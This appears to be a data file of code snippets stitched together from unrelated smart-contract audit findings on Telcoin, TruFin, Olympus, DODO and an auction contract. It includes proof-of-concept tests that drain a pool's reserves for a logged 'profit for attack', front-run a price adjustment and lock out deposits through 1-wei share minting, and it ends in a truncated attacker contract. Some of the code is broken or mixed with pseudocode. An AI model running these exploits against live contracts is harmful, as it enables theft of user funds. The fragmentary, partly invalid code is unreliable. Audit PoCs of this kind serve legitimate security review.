"```\nfunction burn(\n    // rest of code\n    balances.pop(); // FOUND: balances.length decreases, while latest minted NFT withholds its unique tokenId\n    _burn(tokenId);\n)\n```\n```\nfunction mint(\n    // rest of code\n    balances.push(0);\n    _mint(newMember, totalSupply());\n)\n```\ndiff --git a/telcoin-audit/test/sablier/CouncilMember.test.ts b/telcoin-audit/test/sablier/CouncilMember.test.ts\nindex 675b89d..ab96b08 100644\n--- a/telcoin-audit/test/sablier/CouncilMember.test.ts\n+++ b/telcoin-audit/test/sablier/CouncilMember.test.ts\n@@ -1,14 +1,14 @@\nimport { expect } from ""chai"";\nimport { ethers } from ""hardhat"";\nimport { SignerWithAddress } from ""@nomicfoundation/hardhat-ethers/signers"";\nimport { CouncilMember, TestTelcoin, TestStream, ERC721Upgradeable__factory } from ""../../typechain-types"";\n\ndescribe(""CouncilMember"", () => {\n    let admin: SignerWithAddress;\n    let support: SignerWithAddress;\n    let member: SignerWithAddress;\n    let holder: SignerWithAddress;\n    let lastCouncilMember: SignerWithAddress;\n    let councilMember: CouncilMember;\n    let telcoin: TestTelcoin;\n    let stream: TestStream;\n\n    let supportRole: string = ethers.keccak256(ethers.toUtf8Bytes(""SUPPORT_ROLE""));\n\n    beforeEach(async () => {\n        [admin, support, member, holder, lastCouncilMember] = await ethers.getSigners();\n\n        const TestTelcoinFactory = await ethers.getContractFactory(""TestTelcoin"", admin);\n        telcoin = await TestTelcoinFactory.deploy(admin.address);\n\n        councilMember = await CouncilMember.deploy(admin.address, support.address);\n    });\n\n    describe(""burn"", () => {\n        it(""the correct removal is made"", async () => {\n            await expect(councilMember.burn(1, support.address)).emit(councilMember, ""Transfer"");\n        });\n\n        it.only(""inoperable contract after burn"", async () => {\n            await expect(councilMember.mint(lastCouncilMember.address)).to.not.reverted;\n\n            // This 1st burn will cause contract inoperable due to tokenId & balances misalignment\n            await expect(councilMember.burn(1, support.address)).emit(councilMember, ""Transfer"");\n\n            // Impact 1. holder with tokenId > balances length cannot claim\n            await expect(councilMember.connect(lastCouncilMember).claim(3, 1)).to.revertedWithPanic(""0x32"");\n\n            // Impact 2. subsequent burns of tokenId > balances length will"
"```\nfunction claimable(uint256 categoryId, uint256 vestingId, address user)\n    public\n    view\n    returns (uint256 claimableAmount)\n{\n    UserVesting memory userVesting = userVestings[categoryId][vestingId][user];\n\n    VestingInfo memory info = vestingInfos[categoryId][vestingId];\n\n    uint64 startTime = userVesting.startTime + info.initialReleasePeriod;\n\n    if (startTime > block.timestamp) {\n        return 0;\n    }\n\n    uint256 totalAmount = userVesting.amount;\n\n    uint256 initialRelease = (totalAmount * info.initialReleasePct) / DENOMINATOR;\n\n    startTime += info.cliff;\n\n    if (startTime > block.timestamp) {\n        return initialRelease;\n    }\n```\n```\nfunction claim(\n    address user,\n    uint256 categoryId,\n    uint256 vestingId,\n    uint256 claimAmount\n) public {\n    if (user!= msg.sender && (!categories[categoryId].adminClaimable || msg.sender!= owner())) {\n        revert Forbidden(msg.sender);\n    }\n\n    uint256 claimableAmount = claimable(categoryId, vestingId, user);\n    if (claimAmount == type(uint256).max) {\n        claimAmount = claimableAmount;\n    } else if (claimAmount > claimableAmount) {\n        revert ClaimAmountExceed();\n    }\n    if (claimAmount == 0) {\n        revert ZeroAmount();\n    }\n\n    categories[categoryId].totalClaimed += claimAmount;\n    userVestings[categoryId][vestingId][user].claimed += claimAmount;\n    trufToken.safeTransfer(user, claimAmount);\n\n    emit Claimed(categoryId, vestingId, user, claimAmount);\n}\n```"
"```\nfunction cancelVesting(\n    uint256 categoryId,\n    uint256 vestingId,\n    address user,\n    bool giveUnclaimed\n)\n    external\n    onlyOwner\n{\n    UserVesting memory userVesting = userVestings[categoryId][vestingId][user];\n\n    if (userVesting.amount == 0) {\n        revert UserVestingDoesNotExists(categoryId, vestingId, user);\n    }\n\n    if (userVesting.startTime + vestingInfos[categoryId][vestingId].period <= block.timestamp) {\n        revert AlreadyVested(categoryId, vestingId, user);\n    }\n\n    uint256 lockupId = lockupIds[categoryId][vestingId][user];\n\n    if (lockupId!= 0) {\n        veTRUF.unstakeVesting(user, lockupId - 1, true);\n        delete lockupIds[categoryId][vestingId][user];\n        userVesting.locked = 0;\n    }\n\n    VestingCategory storage category = categories[categoryId];\n\n    uint256 claimableAmount = claimable(categoryId, vestingId, user);\n    if (giveUnclaimed && claimableAmount!= 0) {\n        trufToken.safeTransfer(user, claimableAmount);\n\n        userVesting.claimed += claimableAmount;\n        category.totalClaimed += claimableAmount;\n        emit Claimed(categoryId, vestingId, user, claimableAmount);\n    }\n\n    uint256 unvested = userVesting.amount - userVesting.claimed;\n\n    delete userVestings[categoryId][vestingId][user];\n\n    category.allocated -= unvested;\n\n    emit CancelVesting(categoryId, vestingId, user, giveUnclaimed);\n}\n```\n```\nuint256 lockupId = lockupIds[categoryId][vestingId][user];\n\nif (lockupId!= 0) {\n    veTRUF.unstakeVesting(user, lockupId - 1, true);\n    delete lockupIds[categoryId][vestingId][user];\n    userVesting.locked = 0;\n}\n```"
"```\n/**\n * @notice Migrate owner of vesting. Used when user lost his private key\n * @dev Only admin can migrate users vesting\n * @param categoryId Category id\n * @param vestingId Vesting id\n * @param prevUser previous user address\n * @param newUser new user address\n*/\n```\n```\nif (lockupId!= 0):\n    newLockupId = veTRUF.migrateVestingLock(prevUser, newUser, lockupId - 1) + 1\n    lockupIds[categoryId][vestingId][newUser] = newLockupId\n    del lockupIds[categoryId][vestingId][prevUser]\n\n    newVesting.locked = prevVesting.locked\n```\n```\nfunction withdraw(address user, uint256 amount) public updateReward(user) onlyOperator {\n    if (amount == 0) {\n        revert ZeroAmount();\n    }\n    _totalSupply -= amount;\n    _balances[user] -= amount;\n    emit Withdrawn(user, amount);\n}\n```\n```\nuint256 points = oldLockup.points;\nstakingRewards.withdraw(oldUser, points);\n_burn(oldUser, points);"
"```\nfunction test_ExtendLock_AlreadyEnded() external {\n    uint256 amount = 100e18;\n    uint256 duration = 5 days;\n\n    _stake(amount, duration, alice, alice);\n\n    // 5 days later, lock is ended for Alice\n    skip(5 days + 1);\n\n    (,, uint128 _ends,,) = veTRUF.lockups(alice, 0);\n\n    // Alice's lock is indeed ended\n    assertTrue(_ends < block.timestamp, ""lock is ended"");\n\n    // 36 days passed\n    skip(36 days);\n\n    // Alice extends her already finished lock 30 more days\n    vm.prank(alice);\n    veTRUF.extendLock(0, 30 days);\n\n    (,, _ends,,) = veTRUF.lockups(alice, 0);\n\n    // Alice's lock can be easily unlocked right away\n    assertTrue(_ends < block.timestamp, ""lock is ended"");\n\n    // Alice unstakes her lock, basically alice can unstake her lock anytime she likes\n    vm.prank(alice);\n    veTRUF.unstake(0);\n}\n```"
"```\nfunction storePrice(address asset_) public override permissioned {\n    Asset storage asset = _assetData[asset_];\n\n    // Check if asset is approved\n    if (!asset.approved) {\n        revert PRICE_AssetNotApproved(asset_);\n    }\n\n    (uint256 price, uint48 currentTime) = _getCurrentPrice(asset_);\n\n    // Store the data in the obs index\n    uint256 oldestPrice = asset.obs[asset.nextObsIndex];\n    asset.obs[asset.nextObsIndex] = price;\n\n    // Update the last observation time and increment the next index\n    asset.lastObservationTime = currentTime;\n    asset.nextObsIndex = (asset.nextObsIndex + 1) % asset.numObservations;\n\n    // Update the cumulative observation, if storing the moving average\n    if (asset.storeMovingAverage) {\n        asset.cumulativeObs = asset.cumulativeObs + price - oldestPrice;\n    }\n\n    // Emit event\n    emit PriceStored(asset_, price, currentTime);\n}\n```\n```\nfunction _getCurrentPrice(address asset_) internal view returns (uint256, uint48) {\n    Asset storage asset = _assetData[asset_];\n\n    // Iterate through feeds to get prices to aggregate with strategy\n    Component[] memory feeds = abi.decode(asset.feeds, (Component[]));\n    uint256 numFeeds = feeds.length;\n\n    uint256[] memory prices = asset.useMovingAverage\n       ? new uint256[](numFeeds + 1)\n        : new uint256[](numFeeds);\n    uint8 _decimals = decimals; // cache in memory to save gas\n\n    for (uint256 i = 0; i < numFeeds; i++) {\n        (bool success_, bytes memory data_) = address(_getSubmoduleIfInstalled(feeds[i].target))\n           .staticcall(\n                abi.encodeWithSelector(feeds[i].selector, asset_, _decimals, feeds[i].params)\n            );\n\n        // Store price if successful, otherwise leave as zero\n        // Idea is that if you have several price calls and just\n        // one fails, it'll DOS the contract with this revert.\n        // We handle faulty feeds in the strategy contract.\n        if (success_) prices[i] = abi.decode(data_, (uint256));\n    }\n\n    // If moving average is used in strategy, add to end of prices array\n    if (asset.useMovingAverage) prices[numFeeds] = asset.cumulativeObs / asset.numObservations;\n\n    // If there is only one price, ensure it is not zero and return\n    // Otherwise, send to strategy to aggregate\n    if (prices.length == 1) {\n        if (prices[0] == 0) revert PRICE_PriceZero(asset_);\n        return (prices[0], uint48(block.timestamp));\n    } else {\n        // Get price from strategy\n        Component memory strategy = abi.decode(asset.strategy, (Component));\n        (bool success, bytes memory data) = address(_getSubmoduleIfInstalled(strategy.target))\n           .staticcall(abi.encodeWithSelector(strategy.selector, prices, strategy.params));\n\n        // Ensure call was successful\n        if (!success) revert PRICE_StrategyFailed(asset_, data);\n\n        // Decode asset price\n        uint256 price = abi.decode(data, (uint256));\n\n        // Ensure value is not zero\n        if (price == 0) revert PRICE_PriceZero(asset_);\n\n        return (price, uint48(block.timestamp));\n    }\n}"
"```\nfunction getProtocolOwnedLiquidityOhm() external view override returns (uint256) {\n    uint256 len = bunniTokens.length;\n    uint256 total;\n    for (uint256 i = 0; i < len; ) {\n        TokenData storage tokenData = bunniTokens[i];\n        BunniLens lens = tokenData.lens;\n        BunniKey memory key = _getBunniKey(tokenData.token);\n\n        total += _getOhmReserves(key, lens);\n        unchecked {\n            i++;\n        }\n    }\n    return total;\n}\n```\n```\nfunction deposit(\n    DepositParams calldata params\n)\n    external\n    payable\n    virtual\n    override\n    checkDeadline(params.deadline)\n    returns (uint256 shares, uint128 addedLiquidity, uint256 amount0, uint256 amount1)\n{\n}\n```"
"```\nfunction getStablePoolTokenPrice(\n    address,\n    uint8 outputDecimals_,\n    bytes calldata params_\n) external view returns (uint256) {\n    if (outputDecimals_ > BASE_10_MAX_EXPONENT)\n        revert Balancer_OutputDecimalsOutOfBounds(outputDecimals_, BASE_10_MAX_EXPONENT);\n\n    address[] memory tokens;\n    uint256 poolRate; // pool decimals\n    uint8 poolDecimals;\n    bytes32 poolId;\n\n    // Get tokens in the pool from vault\n    (address[] memory tokens_,, ) = balVault.getPoolTokens(poolId);\n    tokens = tokens_;\n\n    // Get rate\n    try pool.getRate() returns (uint256 rate_) {\n        if (rate_ == 0) {\n            revert Balancer_PoolStableRateInvalid(poolId, 0);\n        }\n        poolRate = rate_;\n    }\n\n    uint256 minimumPrice; // outputDecimals_\n    {\n        for (uint256 i; i < tokens.length; i++) {\n            address token = tokens[i];\n            if (token == address(0)) revert Balancer_PoolTokenInvalid(poolId, i, token);\n\n            (uint256 price_, ) = _PRICE().getPrice(token, PRICEv2.Variant.CURRENT);\n\n            if (minimumPrice == 0) {\n                minimumPrice = price_;\n            } else if (price_ < minimumPrice) {\n                minimumPrice = price_;\n            }\n        }\n    }\n\n    uint256 poolValue = poolRate.mulDiv(minimumPrice, 10 ** poolDecimals);\n}"
"```\npragma solidity ^0.8.0;\n\ncontract BunniPrice {\n    function _validateReserves(\n        BunniKey memory key_,\n        BunniLens lens_,\n        uint16 twapMaxDeviationBps_,\n        uint32 twapObservationWindow_\n    ) internal view {\n        uint256 reservesTokenRatio = BunniHelper.getReservesRatio(key_, lens_);\n        uint256 twapTokenRatio = UniswapV3OracleHelper.getTWAPRatio(\n            address(key_.pool),\n            twapObservationWindow_\n        );\n\n        if (Deviation.isDeviatingWithBpsCheck(\n            reservesTokenRatio,\n            twapTokenRatio,\n            twapMaxDeviationBps_,\n            TWAP_MAX_DEVIATION_BASE\n        )) {\n            revert BunniPrice_PriceMismatch(\n                address(key_.pool),\n                twapTokenRatio,\n                reservesTokenRatio\n            );\n        }\n    }\n}\n\ncontract BunniHelper {\n    function getReservesRatio(BunniKey memory key_, BunniLens lens_) public view returns (uint256) {\n        IUniswapV3Pool pool = key_.pool;\n        uint8 token0Decimals = ERC20(pool.token0()).decimals();\n\n        (uint112 reserve0, uint112 reserve1) = lens_.getReserves(key_);\n        (uint256 fee0, uint256 fee1) = lens_.getUncollectedFees(key_);\n        return (reserve1 + fee1).mulDiv(10 ** token0Decimals, reserve0 + fee0);\n    }\n}\n\ncontract UniswapV3OracleHelper {\n    function getTWAPRatio(address pool_, uint32 period_) public view returns (uint256) {\n        int56 timeWeightedTick = getTimeWeightedTick(pool_, period_);\n        IUniswapV3Pool pool = IUniswapV3Pool(pool_);\n        ERC20 token0 = ERC20(pool.token0());\n        ERC20 token1 = ERC20(pool.token1());\n\n        uint256 baseInQuote = OracleLibrary.getQuoteAtTick(\n            int24(timeWeightedTick),\n            uint128(10 ** token0.decimals()), // 1 unit of token0 => baseAmount\n            address(token0),\n            address(token1)\n        );\n        return baseInQuote;\n    }\n}\n```\nfunction _getTotalValue(\n    BunniToken token_,\n    BunniLens lens_,\n    uint8 outputDecimals_\n) internal view returns (uint256) {\n    (address token0, uint256 reserve0, address token1, uint256 reserve1) = _getBunniReserves(\n        token_,\n        lens_,\n        outputDecimals_\n    );\n\n    uint256 outputScale = 10 ** outputDecimals_;\n\n    uint256 totalValue;\n    totalValue += _PRICE().getPrice(token0).mulDiv(reserve0, outputScale);\n    totalValue += _PRICE().getPrice(token1).mulDiv(reserve1, outputScale);\n\n    return totalValue;\n}\n```\n```\nfunction getProtocolOwnedLiquidityReserves()\n    external\n    view\n    override\n    returns (SPPLYv1.Reserves[] memory)\n{\n    uint256 len = bunniTokens.length;\n    SPPLYv1.Reserves[] memory reserves = new SPPLYv1.Reserves[](len);\n\n    for (uint256 i = 0; i < len; i++) {\n        TokenData storage tokenData = bunniTokens[i];\n        BunniToken token = tokenData.token;\n        BunniLens lens = tokenData.lens;\n        BunniKey memory key = _getBunniKey(token);\n\n        (\n            address token0,\n            address token1,\n            uint256 reserve0,\n            uint256 reserve1\n        ) = _getReservesWithFees(key, lens);\n\n        _validateReserves(\n            key,\n            lens,\n            tokenData.twapMaxDeviationBps,\n            tokenData.twapObservationWindow\n        );\n\n        address[] memory underlyingTokens = new address[](2);\n        underlyingTokens[0] = token0;\n        underlyingTokens[1] = token1;\n        uint256[] memory underlyingReserves = new uint256[](2);\n        underlyingReserves[0] = reserve0;\n        underlyingReserves[1] = reserve1;\n\n        reserves[i] = SPPLYv1.Reserves({\n            source: address(token),\n            tokens: underlyingTokens,\n            balances: underlyingReserves\n        });\n    }\n\n    return reserves;\n}\n```"
"```\nfunction getMedianPriceIfDeviation(\n    uint256[] memory prices_,\n    bytes memory params_\n) public pure returns (uint256) {\n    if (prices_.length < 3) {\n        revert SimpleStrategy_PriceCountInvalid(prices_.length, 3);\n    }\n\n    uint256[] memory nonZeroPrices = _getNonZeroArray(prices_);\n\n    if (nonZeroPrices.length == 0) {\n        return 0;\n    }\n\n    uint256 firstNonZeroPrice = nonZeroPrices[0];\n\n    if (nonZeroPrices.length < 3) {\n        return firstNonZeroPrice;\n    }\n\n    uint256[] memory sortedPrices = _sort(nonZeroPrices);\n\n    uint256 averagePrice = _getAveragePrice(sortedPrices);\n    uint256 medianPrice = _getMedianPrice(sortedPrices);\n\n    if (params_.length!= DEVIATION_PARAMS_LENGTH) {\n        revert SimpleStrategy_ParamsInvalid(params_);\n    }\n\n    uint256 deviationBps = abi.decode(params_, (uint256));\n\n    if (deviationBps <= DEVIATION_MIN || deviationBps >= DEVIATION_MAX) {\n        revert SimpleStrategy_ParamsInvalid(params_);\n    }\n\n    uint256 minPrice = sortedPrices[0];\n\n    if (((averagePrice - minPrice) * 10000) / averagePrice > deviationBps) {\n        return medianPrice;\n    }\n\n    uint256 maxPrice = sortedPrices[sortedPrices.length - 1];\n\n    if (((maxPrice - averagePrice) * 10000) / averagePrice > deviationBps) {\n        return medianPrice;\n    }\n\n    return firstNonZeroPrice;\n}\n```\n```\nfunction _getMedianPrice(uint256[] memory prices_) internal pure returns (uint256) {\n    uint256 pricesLen = prices_.length;\n\n    if (pricesLen % 2 == 0) {\n        uint256 middlePrice1 = prices_[pricesLen / 2 - 1];\n        uint256 middlePrice2 = prices_[pricesLen / 2];\n        return (middlePrice1 + middlePrice2) / 2;\n    }\n\n    return prices_[pricesLen / 2];\n}\n```\nfunction getMedianPrice(uint256[] memory prices_, bytes memory) public pure returns (uint256) {\n    if (prices_.length < 3) revert SimpleStrategy_PriceCountInvalid(prices_.length, 3);\n\n    uint256[] memory nonZeroPrices = _getNonZeroArray(prices_);\n    uint256 nonZeroPricesLen = nonZeroPrices.length;\n\n    if (nonZeroPricesLen == 0) return 0;\n    if (nonZeroPricesLen < 3) return nonZeroPrices[0];\n\n    uint256[] memory sortedPrices = _sortArray(nonZeroPrices);\n\n    return _getMedianPrice(sortedPrices);\n}\n```"
"```\n(, int24 currentTick,,,,, bool unlocked) = params.pool.slot0();\n\nif (unlocked == false) {\n    revert UniswapV3_PoolReentrancy(address(params.pool));\n}\n```\n```\nVaultReentrancyLib.ensureNotInVaultContext(balVault)\n```\n_validateReserves(\n    _getBunniKey(token),\n    lens,\n    params.twapMaxDeviationsBps,\n    params.twapObservationWindow\n)\n```\nif (asset.useMovingAverage):\n    prices[numFeeds] = asset.cumulativeObs / asset.numObservations"
"```\n_addCategory(toCategory(""protocol-owned-treasury""), true, 0xb600c5e2, 0x00000000);\n```\n```\nfunction getReservesByCategory(\n    Category category_\n) external view override returns (Reserves[] memory) {\n    // If category requires data from submodules, count all submodules and their sources.\n    uint256 len = (data.useSubmodules)? submodules.length : 0;\n\n    for (uint256 i; i < len; ) {\n        address submodule = address(_getSubmoduleIfInstalled(submodules[i]));\n        (bool success, bytes memory returnData) = submodule.staticcall(\n            abi.encodeWithSelector(data.submoduleReservesSelector)\n        );\n```\n```\nfunction test_getReservesByCategory_includesSubmodules_treasury() public {\n    _setUpSubmodules();\n\n    ohm.mint(address(treasuryAddress), 100e9);\n    gohm.mint(address(treasuryAddress), 1e18); // 1 gOHM\n\n    // Categories already defined\n\n    uint256 expectedBptDai = BPT_BALANCE.mulDiv(\n        BALANCER_POOL_DAI_BALANCE,\n        BALANCER_POOL_TOTAL_SUPPLY\n    );\n\n    uint256 expectedBptOhm = BPT_BALANCE.mulDiv(\n        BALANCER_POOL_OHM_BALANCE,\n        BALANCER_POOL_TOTAL_SUPPLY\n    );\n\n    // Check reserves\n    SPPLYv1.Reserves[] memory reserves = moduleSupply.getReservesByCategory(\n        toCategory(""protocol-owned-treasury"")\n    );\n}\n```\n```\nforge test -vv --match-test test_getReservesByCategory_includesSubmodules_treasury\n\nRunning 1 test for src/test/modules/SPPLY/SPPLY.v1.t.sol:SupplyTest\n[FAIL. Reason: SPPLY_SubmoduleFailed(0xeb502B1d35e975321B21cCE0E8890d20a7Eb289d, 0x0000000000000000000000000000000000000000000000000000000000000000)]\ntest_getReservesByCategory_includesSubmodules_treasury() (gas: 4774197)"
```\nuint256 balTotalSupply = pool.balancerPool.totalSupply();\nuint256[] memory balances = new uint256[](_vaultTokens.length);\n\nif (balTotalSupply!= 0) {\n    uint256 tokenLen = _vaultTokens.length;\n    for (uint256 i = 0; i < tokenLen; i++) {\n        uint256 balance = _vaultBalances[i];\n        uint256 polBalance = (balance * balBalance) / balTotalSupply;\n        balances[i] = polBalance;\n    }\n}\n```
"```\nfunction getTokenPriceFromStablePool(\n    address lookupToken_,\n    uint8 outputDecimals_,\n    bytes calldata params_\n) external view returns (uint256) {\n    try pool.getLastInvariant() returns (uint256, uint256 ampFactor) {\n        lookupTokensPerDestinationToken = StableMath._calcOutGivenIn(\n            ampFactor,\n            balances_,\n            destinationTokenIndex,\n            lookupTokenIndex,\n            1e18,\n            StableMath._calculateInvariant(ampFactor, balances_) // Sometimes the fetched invariant value does not work, so calculate it\n        );\n    }\n```\n```\nfunction startAmplificationParameterUpdate(uint256 rawEndValue, uint256 endTime) external authenticate {\n\nfunction _onSwapGivenIn(\n    SwapRequest memory swapRequest,\n    uint256[] memory balances,\n    uint256 indexIn,\n    uint256 indexOut\n) internal virtual override whenNotPaused returns (uint256) {\n    (uint256 currentAmp, ) = _getAmplificationParameter();\n    uint256 amountOut = StableMath._calcOutGivenIn(currentAmp, balances, indexIn, indexOut, swapRequest.amount);\n    return amountOut;\n}\n```"
"```\nfunction isDeviatingWithBpsCheck(\n    uint256 value0_,\n    uint256 value1_,\n    uint256 deviationBps_,\n    uint256 deviationMax_\n) internal pure returns (bool) {\n    if (deviationBps_ > deviationMax_) {\n        revert Deviation_InvalidDeviationBps(deviationBps_, deviationMax_);\n    }\n\n    return isDeviating(value0_, value1_, deviationBps_, deviationMax_);\n}\n\nfunction isDeviating(\n    uint256 value0_,\n    uint256 value1_,\n    uint256 deviationBps_,\n    uint256 deviationMax_\n) internal pure returns (bool) {\n    return (\n        value0_ < value1_\n           ? _isDeviating(value1_, value0_, deviationBps_, deviationMax_)\n            : _isDeviating(value0_, value1_, deviationBps_, deviationMax_)\n    );\n}\n```\n```\nfunction _isDeviating(\n    uint256 value0_,\n    uint256 value1_,\n    uint256 deviationBps_,\n    uint256 deviationMax_\n) internal pure returns (bool) {\n    return ((value0_ - value1_) * deviationMax_) / value0_ > deviationBps_;\n}\n```\n```\nif (\n    Deviation.isDeviatingWithBpsCheck(\n        baseInQuotePrice,\n        baseInQuoteTWAP,\n        params.maxDeviationBps,\n        DEVIATION_BASE\n    )\n) {\n    revert UniswapV3_PriceMismatch(address(params.pool), baseInQuoteTWAP, baseInQuotePrice);\n}\n```"
"```\nfunction test_poolCanBeDrained() public {\n    uint256 _amount = 99959990000000000000000;\n\n    vm.startPrank(tapir);\n\n    dai.transfer(address(gsp), 10 * 1e18);\n    usdc.transfer(address(gsp), 10 * 1e6);\n    gsp.buyShares(tapir);\n\n    assertTrue(gsp._BASE_RESERVE_() == 10 * 1e18);\n    assertTrue(gsp._QUOTE_RESERVE_() == 10 * 1e6);\n    assertTrue(gsp._BASE_TARGET_() == 10 * 1e18);\n    assertTrue(gsp._QUOTE_TARGET_() == 10 * 1e6);\n    assertEq(gsp.balanceOf(tapir), 10 * 1e18);\n\n    vm.stopPrank();\n\n    vm.startPrank(hippo);\n    deal(DAI, hippo, _amount);\n    dai.transfer(address(gsp), _amount);\n    uint256 receivedQuoteAmount = gsp.sellBase(hippo);\n\n    console.log(""Received quote amount by hippo"", receivedQuoteAmount);\n    console.log(""Base reserve"", gsp._BASE_RESERVE_());\n    console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n\n    assertEq(gsp._QUOTE_RESERVE_(), 0);\n\n    usdc.transfer(address(gsp), receivedQuoteAmount);\n\n    uint256 receivedBaseAmount = gsp.sellQuote(hippo);\n\n    console.log(""Received base amount by hippo"", receivedBaseAmount);\n    console.log(""Base target"", gsp._BASE_TARGET_());\n    console.log(""Quote target"", gsp._QUOTE_TARGET_());\n    console.log(""Base reserve"", gsp._BASE_RESERVE_());\n    console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n\n    assertGe(receivedBaseAmount, _amount);\n    console.log(""Profit for attack"", receivedBaseAmount - _amount);\n}\n```"
"```\nfunction test_Adjusting_I_CanBeFrontrunned() external {\n    vm.startPrank(tapir);\n\n    dai.safeTransfer(address(gsp), 10 * 1e18);\n    usdc.transfer(address(gsp), 10 * 1e6);\n    gsp.buyShares(tapir);\n\n    console.log(""Base target initial"", gsp._BASE_TARGET_());\n    console.log(""Quote target initial"", gsp._QUOTE_TARGET_());\n    console.log(""Base reserve initial"", gsp._BASE_RESERVE_());\n    console.log(""Quote reserve initial"", gsp._QUOTE_RESERVE_());\n\n    uint256 initialBaseTokensSwapped = 5 * 1e18;\n\n    dai.safeTransfer(address(gsp), initialBaseTokensSwapped);\n    uint256 receivedQuoteTokens = gsp.sellBase(tapir);\n    vm.stopPrank();\n\n    vm.prank(MAINTAINER);\n    gsp.adjustPrice(999000);\n\n    vm.startPrank(tapir);\n    usdc.safeTransfer(address(gsp), receivedQuoteTokens);\n    uint256 receivedBaseTokens = gsp.sellQuote(tapir);\n    console.log(""Base target"", gsp._BASE_TARGET_());\n    console.log(""Quote target"", gsp._QUOTE_TARGET_());\n    console.log(""Base reserve"", gsp._BASE_RESERVE_());\n    console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n    console.log(""Received base tokens"", receivedBaseTokens);\n\n    assertGe(receivedBaseTokens, initialBaseTokensSwapped);\n}\n```"
"```\nif (totalSupply == 0) {\n    if (quoteBalance < DecimalMath.mulFloor(baseBalance, _I_)) {\n        shares = DecimalMath.divFloor(quoteBalance, _I_);\n    } else {\n        shares = baseBalance;\n    }\n    _BASE_TARGET_ = uint112(shares);\n    _QUOTE_TARGET_ = uint112(DecimalMath.mulFloor(shares, _I_));\n```\n```\nfunction mulFloor(uint256 target, uint256 d) internal pure returns (uint256) {\n    return target * d / (10 ** 18);\n}\n```\n```\n_QUOTE_TARGET_ = uint112(uint256(_QUOTE_TARGET_) + DecimalMath.mulFloor(uint256(_QUOTE_TARGET_), mintRatio))\n```\n```\nfunction test_StartWithZeroTarget() external {\n    vm.startPrank(tapir);\n    dai.safeTransfer(address(gsp), 1 * 1e5);\n    usdc.transfer(address(gsp), 1 * 1e5);\n    gsp.buyShares(tapir);\n\n    console.log(""Base target"", gsp._BASE_TARGET_());\n    console.log(""Quote target"", gsp._QUOTE_TARGET_());\n    console.log(""Base reserve"", gsp._BASE_RESERVE_());\n    console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n\n    assertEq(gsp._QUOTE_TARGET_(), 0);\n\n    vm.stopPrank();\n\n    vm.startPrank(hippo);\n    dai.safeTransfer(address(gsp), 1000 * 1e18);\n    usdc.transfer(address(gsp), 10000 * 1e6);\n    gsp.buyShares(hippo);\n\n    console.log(""Base target"", gsp._BASE_TARGET_());\n    console.log(""Quote target"", gsp._QUOTE_TARGET_());\n    console.log(""Base reserve"", gsp._BASE_RESERVE_());\n    console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n\n    assertEq(gsp._QUOTE_TARGET_(), 0);\n}\n```"
"```\nfunction buyShares(address to) {\n    // rest of code\n    // case 1. initial supply\n    // The shares will be minted to user\n    shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_) \n       ? DecimalMath.divFloor(quoteBalance, _I_)\n        : baseBalance; // <= FOUND\n    // The target will be updated\n    _BASE_TARGET_ = uint112(shares);\n    // rest of code\n}\n```\n```\n// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol\n\nfunction buyShares(address to) {\n    // rest of code\n    uint256 baseInputRatio = DecimalMath.divFloor(baseInput, baseReserve);\n    uint256 quoteInputRatio = DecimalMath.divFloor(quoteInput, quoteReserve);\n    uint256 mintRatio = quoteInputRatio < baseInputRatio? quoteInputRatio : baseInputRatio; // <= FOUND: mintRatio below 1001wad if input amount smaller than reserves * 1001\n    // The shares will be minted to user\n    shares = DecimalMath.mulFloor(totalSupply, mintRatio); // <= FOUND: the manipulated totalSupply of 1wei requires a mintRatio of greater than 1000 for a successful _mint()\n    // rest of code\n}\n\n// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPVault.sol\n\nfunction _mint(address user, uint256 value) internal {\n    require(value > 1000, ""MINT_AMOUNT_NOT_ENOUGH""); // <= FOUND: next buyShares with volume less than 1001 x attacker balance will revert here\n    // rest of code\n}\n```\n```\nfunction test_mint1weiShares_DOSx1000DonationVolume() public {\n    GSP gspTest = new GSP();\n    gspTest.init(\n        MAINTAINER,\n        address(mockBaseToken),\n        address(mockQuoteToken),\n        0,\n        0,\n        1000000,\n        500000000000000,\n        false\n    );\n\n    vm.startPrank(USER);\n    mockBaseToken.transfer(address(gspTest), 1001);\n    mockQuoteToken.transfer(address(gspTest), 1001 * gspTest._I_() / 1e18);\n    gspTest.buyShares(USER);\n    assertEq(gspTest.balanceOf(USER), 1001);\n\n    gspTest.sellShares(1000, USER, 0, 0, """", block.timestamp);\n    assertEq(gspTest.balanceOf(USER), 1);\n\n    uint256 donationAmount = 1000e18;\n    mockBaseToken.transfer(address(gspTest), donationAmount);\n    mockQuoteToken.transfer(address(gspTest), donationAmount * gspTest._I_() / 1e18);\n    gspTest.sync();\n    vm.stopPrank();\n\n    uint256 dosAmount = donationAmount * 1001;\n    mockBaseToken.mint(OTHER, type(uint256).max);\n    mockQuoteToken.mint(OTHER, type(uint256).max);\n\n    vm.startPrank(OTHER);\n    mockBaseToken.transfer(address(gspTest), dosAmount);\n    mockQuoteToken.transfer(address(gspTest), dosAmount * gspTest._I_() / 1e18);\n\n    vm.expectRevert(""MINT_AMOUNT_NOT_ENOUGH"");\n    gspTest.buyShares(OTHER);\n    vm.stopPrank();\n}"
"```\nfunction _createAuction() private returns (bool) {\n    try {\n        uint256 tokenId = token.mint();\n        // Store the token id\n        auction.tokenId = tokenId;\n\n        // Cache the current timestamp\n        uint256 startTime = block.timestamp;\n\n        // Used to store the auction end time\n        uint256 endTime;\n\n        // Cannot realistically overflow\n        unchecked {\n            // Compute the auction end time\n            endTime = startTime + settings.duration;\n        }\n\n        // Store the auction start and end time\n        auction.startTime = uint40(startTime);\n        auction.endTime = uint40(endTime);\n\n        // Reset data from the previous auction\n        auction.highestBid = 0;\n        auction.highestBidder = address(0);\n        auction.settled = false;\n\n        // Reset referral from the previous auction\n        currentBidReferral = address(0);\n\n        emit AuctionCreated(tokenId, startTime, endTime);\n        return true;\n    } catch {\n        // Pause the contract if token minting failed\n        _pause();\n        return false;\n    }\n}\n```\n```\npragma solidity ^0.8.16;\n\ncontract Attacker {\n    function forcePause(address target) external {\n        bytes4 selector = 